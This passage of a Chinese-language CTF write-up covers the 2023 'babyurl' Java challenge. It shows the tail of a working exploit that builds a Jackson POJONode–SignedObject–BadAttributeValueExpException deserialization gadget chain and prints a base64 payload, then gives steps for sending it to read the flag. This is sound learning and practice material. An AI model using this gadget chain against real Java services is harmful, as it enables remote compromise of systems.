class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除 pojoNode 的 writeReplace</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">            jsonNode.removeMethod(writeReplace);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            jsonNode.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aaa</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> aaa.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, pojoNode);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(ser);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(ser.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>D盘的tmp文件夹下有flag文件</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png" class>
+
+<p>在此目录下用python开个web服务</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png" class>
+
+<p>exp运行是一串很长的base64，get传进去会报错，则需要url编码一下。</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png" class>
+
+<p>接着访问file路由</p>
+<img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png" class>
+
+<p>可以读取到flag。</p>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>之前没怎么做过java题，复现这道题的时候开头也确实比较迷。网上也只能找到两三个这道题的wp，一般都是直接甩个exp就没了，有的exp写的也并不是很完整，比如那个踩坑的地方。然后就网上看文章，自己用idea慢慢调。总之收获还是蛮大的。据说这道题和之前阿里云CTF的java题的思路很像。阿里云CTF的java题我也保存有附件，搭好环境在idea吃灰呢。看来得找个时间复现一下了。</p>
+<p>另外非常感谢师傅们的文章</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.viewofthai.link/2023/07/22/%e5%b7%85%e5%b3%b0%e6%9e%81%e5%ae%a2ctf-2023-%e4%b8%8a-babyurl/">https://www.viewofthai.link/2023/07/22/%e5%b7%85%e5%b3%b0%e6%9e%81%e5%ae%a2ctf-2023-%e4%b8%8a-babyurl/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12509">https://xz.aliyun.com/t/12509</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">二次反序列化</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="/img/art/a3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="2023阿里云CTF-ezbean题目复现与分析"><img class="cover" src="/img/art/a3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023阿里云CTF-ezbean题目复现与分析</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/" title="fastjson反序列化&lt;=1.2.47绕过"><img class="cover" src="/img/art03.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">fastjson反序列化&lt;=1.2.47绕过</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现"><img class="cover" src="/img/art/a2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">0ctf-2021 buggyLoader题目复现</div></div></a></div><div><a href="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/" title="2022蓝帽杯Ez_gadget题目分析"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-30</div><div class="title">2022蓝帽杯Ez_gadget题目分析</div></div></a></div><div><a href="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="2023阿里云CTF-ezbean题目复现与分析"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-28</div><div class="title">2023阿里云CTF-ezbean题目复现与分析</div></div></a></div><div><a href="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/" title="DASCTF X CBCTF 2023  bypassjava 复现"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-25</div><div class="title">DASCTF X CBCTF 2023  bypassjava 复现</div></div></a></div><div><a href="/2023/03/17/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget%E5%A4%8D%E7%8E%B0/" title="东华杯ezgadget复现"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-17</div><div class="title">东华杯ezgadget复现</div></div></a></div><div><a href="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/" title="Log4j2 JNDI注入漏洞(CVE-2021-44228)"><img class="cover" src="/img/art03.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-01</div><div class="title">Log4j2 JNDI注入漏洞(CVE-2021-44228)</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x02 题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A2%E5%AF%BB%E4%B9%8B%E6%97%85"><span class="toc-number">3.1.</span> <span class="toc-text">二次反序列化探寻之旅</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SignedObject"><span class="toc-number">3.1.1.</span> <span class="toc-text">SignedObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jackson%E8%A7%A6%E5%8F%91getter%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">Jackson触发getter流程分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POJONode"><span class="toc-number">3.1.3.</span> <span class="toc-text">POJONode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">3.1.4.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.2.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91"><span class="toc-number">3.3.</span> <span class="toc-text">踩坑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x04 题目复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">4.1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x05 小结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JDBC反序列化漏洞分析"/></a><div class="content"><a class="title" href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析">JDBC反序列化漏洞分析</a><time datetime="2023-11-10T08:44:29.000Z" title="发表于 2023-11-10 16:44:29">2023-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Nagini 打靶记录"><img src="/img/art/a7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nagini 打靶记录"/></a><div class="content"><a class="title" href="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Nagini 打靶记录">Nagini 打靶记录</a><time datetime="2023-11-08T14:03:45.000Z" title="发表于 2023-11-08 22:03:45">2023-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现"><img src="/img/art/a2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0ctf-2021 buggyLoader题目复现"/></a><div class="content"><a class="title" href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现">0ctf-2021 buggyLoader题目复现</a><time datetime="2023-11-02T12:34:36.000Z" title="发表于 2023-11-02 20:34:36">2023-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" title="thinkphp 5.1 rce流程分析"><img src="/img/art/a5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="thinkphp 5.1 rce流程分析"/></a><div class="content"><a class="title" href="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" title="thinkphp 5.1 rce流程分析">thinkphp 5.1 rce流程分析</a><time datetime="2023-10-30T09:15:14.000Z" title="发表于 2023-10-30 17:15:14">2023-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/" title="thinkphp 5.0.23 RCE分析"><img src="/img/art/a4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="thinkphp 5.0.23 RCE分析"/></a><div class="content"><a class="title" href="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/" title="thinkphp 5.0.23 RCE分析">thinkphp 5.0.23 RCE分析</a><time datetime="2023-10-27T13:04:32.000Z" title="发表于 2023-10-27 21:04:32">2023-10-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art/a3.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
